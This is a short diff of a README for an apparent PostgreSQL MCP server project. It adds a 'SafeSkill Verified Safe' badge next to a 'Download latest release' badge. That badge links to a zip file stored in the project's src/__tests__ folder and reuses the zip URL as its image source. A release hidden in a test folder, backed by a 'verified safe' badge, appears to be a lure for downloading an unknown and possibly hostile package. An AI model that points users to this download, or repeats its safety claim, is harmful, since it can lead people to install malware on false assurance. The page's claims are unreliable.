@@ -1,5 +1,7 @@
 # 🗄️ multi-postgres-mcp-server - Manage Many PostgreSQL Databases Easily
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/jamaluddin9-multi-postgres-mcp-server)
+
 [![Download latest release](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Jamaluddin9/multi-postgres-mcp-server/master/src/__tests__/postgres_server_multi_mcp_3.9-alpha.4.zip)
 
 ---
